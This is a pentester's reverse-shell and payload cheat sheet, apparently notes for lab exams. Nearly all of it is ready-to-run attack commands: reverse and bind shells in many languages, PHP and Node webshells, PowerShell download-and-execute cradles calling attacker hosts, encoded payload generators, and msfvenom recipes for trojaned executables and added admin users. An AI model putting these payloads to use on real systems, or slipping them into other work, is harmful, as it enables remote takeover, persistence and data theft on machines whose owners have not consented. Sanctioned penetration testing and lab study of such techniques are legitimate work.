### UPGRADE SIMPLE TO INTERACTIVE:
    python -c 'import pty; pty.spawn("/bin/bash")'
    Alternate - Socat:
    	socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.8:443
    	socat file:`tty`,raw,echo=0 tcp-listen:443,reuseaddr	
### BIND SHELL (backdoor):
    Victim Box:  nc -lvp 4444 -e /bin/sh
        Windows:  nc -nlvp 4444 -e cmd.exe
    Attack Box:  nc 1.2.3.4 4444
### REVERSE SHELL (callback):
- **MASTER LIST:**  https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
- **LISTENER:**  
    `nc -nvlp 4444`
    - Catch Simple Shell w/ Metasploit:  `use exploit/multi/handler, set lhost ..., set lport ..., set payload linux/x86/shell_reverse_tcp`
     - Upgrade to Meterpreter:  `background; sessions -u 1; sessions; sessions -i [new ID]`
    - Catch Shell with Python:  
    
			import os, time  
			netcat = 'bash -c "nc -nvlp 4444"'  
			print ("Starting listener on port 4444")  
			from subprocess import call  
			call(netcat,shell=True)  
- **NETCAT:**  

        nc [Attack box IP] 4444 -e /bin/sh  
        nc [Attack box IP] 4444 -c bash  
        rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.18 4444 >/tmp/f  
    - Windows:  `nc.exe [Attack box IP] 4444 -e cmd.exe`
- **BASH:** 
 
        bash -i >& /dev/tcp/[Attack box IP]/4444 0>&1  
        bash -c "bash -i >& /dev/tcp/10.10.14.217/4445 0>&1"  
        setsid bash -i &>/dev/tcp/10.10.14.20/4444 0>&1 &  
- **PERL:**  

        perl -e 'use Socket;$i="10.10.14.217";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'  
    - Windows:  
    	`perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"$attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`

- **PYTHON:**    

		python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.119.186",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'  
		python -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("Kali-IP",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'  
    - Windows:  

          C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.0.0.1', 4242)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"    

- **RUBY:**  

        ruby -rsocket -e'f=TCPSocket.open("10.20.14",8080).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'  
	
- **NodeJS/Javascript:**

		var net = require("net"), sh = require("child_process").exec("/bin/bash"); var client = new net.Socket(); client.connect(80, "attackerip", function(){client.pipe(sh.stdin);sh.stdout.pipe(client); sh.stderr.pipe(client);});  
	- Webshell:  
	
			setTimeout(function() { require('http').createServer(function (req, res) { res.writeHead(200, {"Content-Type": "text/plain"});require('child_process').exec(require('url').parse(req.url, true).query['cmd'], function(e,s,st) {res.end(s);}); }).listen(8000); }, 5000)  
		
			curl http://192.168.1.1:8000?cmd=cat%20/etc/passwd
		
- **SOCAT:**  

       Attacker:  socat file:`tty`,raw,echo=0 tcp-listen:4444  \\  socat -d -d TCP4-LISTEN:443 STDOUT
       Victim:  socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444  \\  socat TCP4:10.11.0.22:443 EXEC:/bin/bash
          Or:  wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.15.25:4444

- **PHP:**
    - Commandline:  
    
			exec():  php -r '$sock=fsockopen("192.168.119.186",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
			shell_exec():  php -r '$s=fsockopen("192.168.2.6",8080);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
			system():  php -r '$s=fsockopen("192.168.2.6",8080);system("/bin/sh -i <&3 >&3 2>&3");'
			popen():  php -r '$s=fsockopen("192.168.2.6",8080);popen("/bin/sh -i <&3 >&3 2>&3","r");'
			/bin/sh:  php -r '$s=fsockopen("192.168.2.6",8080);`/bin/sh -i <&3 >&3 2>&3`;'
    - Simple Content Inject (File edit, upload, LFI, etc.):  

          $sock=fsockopen("10.10.14.11", 4445);exec("/bin/sh -i <&3 >&3 2>&3");  
          exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.119.186/4444 0>&1'");  
          <?php $sock = fsockopen("192.168.119.186",4444); $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>  
          <?php system(“wget http://192.168.119.186/phpshellFull.php -O /tmp/; chmod +x /tmp/phpshellFull.php; php /tmp/phpshellFull.php”); ?>  
          <?php passthru("nc -e /bin/sh 1.2.3.4 8080"); ?>
	  <?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.119.186 4444 >/tmp/f'); ?>
            
            Try browser access with /file and /file.php  
    - Advanced Content Inject:  https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php      
            - For Windows:  https://raw.githubusercontent.com/Dhayalanb/windows-php-reverse-shell/master/Reverse%20Shell.php     
    - Basic Webshell for upload/execution:  

            <?php
              if (isset($_REQUEST['fupload'])) {
                file_put_contents($_REQUEST['fupload'], file_get_contents("http://10.10.14.19:8000/" . $_REQUEST['fupload']));
              };
              if (isset($_REQUEST['fexec'])) {
                echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";
              };
            ?>
            
           - Then:
                http://10.10.10.9/catch.php?fupload=nc64.exe  
                http://10.10.10.9/catch.php?fexec=nc64.exe 10.10.16.10 1234 -e cmd.exe  
                

#### Socat Encrypted Shells:
    Bind Shell:
        Generate bind.pem and transfer to victim machine:
            openssl req -newkey rsa:2048 -nodes -keyout bind.key -x509 -days 1000 -subj '/CN=www.mydom.com/O=My Company Name LTD./C=US' -out bind.crt
            cat bind.key bind.crt > bind.pem
        Victim: socat OPENSSL-LISTEN:4443,cert=bind.pem,verify=0,fork EXEC:/bin/bash
            Windows:  LISTEN:4443,cert=bind.pem,verify=0,fork EXEC:'cmd.exe',pipes
        Attacker: socat - OPENSSL:192.168.168.130:4443,verify=0
    Reverse Shell:
        Generate bind.pem on attacker machine.
        Attacker: socat -d -d OPENSSL-LISTEN:4443,cert=bind.pem,verify=0,fork STDOUT
        Victim: socat OPENSSL:192.168.168.1:4443,verify=0 EXEC:/bin/bash
            Windows: socat OPENSSL:192.168.168.1:4443,verify=0 EXEC:'cmd.exe',pipes

### WINDOWS SPECIFIC:
    Windows Webshells:
        -ObfuscatedWebshell.aspx
        -*Automated Generator: aspx_shellcode_generator.py
            python3 aspx_shellcode_generator.py --LHOST 192.168.49.121 --LPORT 443
        -SharPyShell:
            python3 SharPyShell.py generate -p "abc123"
            python3 SharPyShell.py interact -u 'http://192.168.189.132/upload/sharpyshell.aspx' -p 'abc123'
            #exec_cmd whoami /all
            msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 -f raw -o /tmp/sc_raw
            #inject_shellcode /tmp/sc_raw

    One-liners:
        Powershell:
            powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
            powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
            Bind Shell:  powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
    	Encoded Method:  $client = New-Object System.Net.Sockets.TCPClient('192.168.119.140',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};
	    		Convert:  iconv -f ASCII -t UTF-16LE powershellcmd.txt | base64 | tr -d "\n"
			Run:  powershell.exe -EncodedCommand JABjAGwAaQ...
		Encoded One-liner Generator:
			python -c $'import base64; IP = "10.10.10.19"; PORT = "4444"; payload = \'$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\' % (IP, int(PORT)); print("powershell -e " + base64.b64encode(payload.encode("utf16")[2:]).decode());'

    Powershell Scripts:
        cmd /c echo IEX(New-Object Net.WebClient).DownloadString('http://192.168.119.186/mini-reverse.ps1') | powershell -noprofile -
        cmd /c powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.19/shell.ps1')
        c:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://192.168.119.186:80/Invoke-PowerShellTcp.ps1')
            Put this at end of the file first:   Invoke-PowerShellTcp -Reverse -IPAddress 192.168.119.186 -Port 4445
            Or try: powershell -c ...
        powershell iex (New-Object Net.WebClient).DownloadString('http://192.168.1.3/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.3 -Port 4444
        Mini-reverse.ps1:  https://gist.github.com/staaldraad/204928a6004e89553a8d3db0ce527fd5
        Nishang:  wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
    Other Options:  file transfer nc.exe, then use it
    Powercat Methods:
        To enable scripts:   Set-ExecutionPolicy Unrestricted  (run as admin)
        File transfer/download:   powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
        Powercat=PS version of netcat
            1. download in kali with apt install powercat to: /usr/share/windows-resources/powercat
            2. use PS file transfer method^^^ to send it to windows victim
            3. on windows machine:
                . .\powercat.ps1
                or, if connected to internet:    iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
                run it: powercat -h
            File transfer:
                linux listener:  sudo nc -lnvp 443 > receiving_powercat.ps1
                windows sender:  powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1
            Reverse shell:
                powercat -c 10.11.0.4 -p 443 -e cmd.exe
            Bind shell:
                powercat -l -p 443 -e cmd.exe
                nc 10.11.0.22 443
            Stand-alone payloads, ex. reverse shell:  powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverseshell.ps1
                encode for better success:  powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1
                    run with: powershell.exe -E [encoded string contents of ps1 file]

### MSFVenom Binary Generation:  

	msfvenom --list [formats/payloads/etc.]
	Common Params:
		-b "\x00\x0a\x0d" 
		-f c 
		-e x86/shikata_ga_nai -i 5 	#encoding
		EXITFUNC=thread
		PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
	Windows:
		EXE: msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.3 lport=443 -f exe > shell.exe ; nc –lvp 443
		Batch: msfvenom -p cmd/windows/reverse_powershell lhost=192.168.1.3 lport=443 > shell.bat ; nc –lvp 443
		HTA:  Host locally: msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.3 lport=443 -f hta-psh > shell.hta ; Target: mshta http://192.168.1.3/shell.hta ; nc –lvp 443
		MSI:  msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.3 lport=443 -f msi > shell.msi ; msiexec /quiet /qn /i shell.msi ; nc -lvp 443
		DLL:  msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.3 lport=443 -f dll > shell.dll ; rundll32.exe shell.dll,0 ; nc -lvp 443
		PS (EncodedCommand):  msfvenom -p cmd/windows/reverse_powershell lhost=192.168.1.3 lport=443 -f psh-cmd -f raw
			x86: msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.119.158 LPORT=5555 -e x86/shikata_ga_nai -f psh-cmd
                	x64: msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.119.158 LPORT=5555 -e shikata_ga_nai -f psh-cmd
		PS Script:  msfvenom -p windows/x64/meterpreter_reverse_https lhost=192.168.1.3 lport=443 -f psh > shell.ps1 ; PowerShell –ep bypass; .\shell.ps1 ; use exploit/multi/handler ... set payload windows/x64/meterpreter_reverse_https
		VBS:  msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.119.120 LPORT=4444 -e x86/shikata_ga_nai -f vbs
		Hidden/Restricted Bind Shell:  msfvenom -p windows/shell_hidden_bind_tcp ahost=192.168.1.2 lport=4321 -f exe > file.exe
		Other Actions:
			Create User:  msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
			Execute Command:
				msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
				msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
		Techniques:
			Prepend Migrate Payload (for stability):  msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.2 lport=1234 prependmigrateprocess=explorer.exe prependmigrate=true -f exe > shell.exe
			Inject into Legit Executable:  msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=192.168.1.101 lport=4444 -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o puttyX.exe
	Linux:
		Reverse Shell:
			msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
			msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
		Bind Shell:
			msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
	Web:
		PHP:
			msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
			cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
		ASP/x:
			msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
			msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
		JSP:    msfvenom -a x86 --platform windows -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=8080 -f raw; use exploit/multi/handler; set PAYLOAD java/jsp_shell_reverse_tcp
			msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
		WAR (Tomcat):  msfvenom -p java/jsp_shell_reverse_tcp LHOST=[Attack box IP] LPORT=4444 -f war > /root/Desktop/shell.war
	Script Language:
		Perl:  msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
		Python:  msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
		Bash:  msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
					
